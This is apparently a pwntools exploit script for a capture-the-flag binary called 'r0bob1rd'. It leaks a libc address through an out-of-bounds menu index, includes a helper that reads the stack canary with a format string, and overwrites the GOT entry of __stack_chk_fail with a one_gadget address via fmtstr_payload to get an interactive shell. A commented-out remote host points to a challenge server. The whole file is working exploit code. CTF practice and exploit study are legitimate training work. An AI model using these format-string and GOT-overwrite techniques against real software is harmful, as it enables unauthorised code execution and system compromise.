#!/usr/bin/python3.11

from pwn import *

exe = ELF("r0bob1rd",checksec=False)
libc = ELF("./glibc/libc.so.6",checksec=False)
ld = ELF("./glibc/ld.so.2",checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

# break *0x0000000000400B14		scanf to get birdname index
# break *0x0000000000400BB6		fgets to 104 buffer
gs = '''
handle SIGALRM ignore
# break *0x0000000000400B14
break *0x0000000000400BB6
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def choose_bird(index: int):
    io.sendlineafter(b"> ", str(index).encode())

def enter_description(value):
    io.sendlineafter(b"> ", value)

def leak_libc():
	choose_bird(12)
	result = io.recv()
	values = result.split(b" ")
	leaked_bytes = values[2][0:6]
	leaked_address_int = u64(leaked_bytes.ljust(8, b"\x00"))
	print(f"{hex(leaked_address_int)=}")
	libc.address = leaked_address_int - 0x1ed6a0
	print(f"{hex(libc.address)=}")
 
def leak_canary() -> int:
    enter_description("%21$p")
    sleep(3)
    input("waiting...")
    result = io.recv()
    leaked_bytes = result.split(b"\n")
    leaked_canary = leaked_bytes[7]
    leaked_canary_int = int(leaked_canary.decode(), 16)
    print(f"{hex(leaked_canary_int)=}")
    return leaked_canary_int
    
	
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
io = start_local(isDebug)

######## REMOTE ########
# remote_address = "83.136.250.192:56775"
# io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.5

leak_libc()

# Locate where is our input landing on the stack.
# enter_description("wwwwwwww %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p ")

write = {exe.got["__stack_chk_fail"]: libc.address + 0xe3b01 }
payload = fmtstr_payload(8, write, write_size='short')
print(f"{len(payload)=}")
payload += b"w" * (104 - len(payload))
print(f"string format payload: {payload.decode()}")
enter_description(payload)

io.interactive()
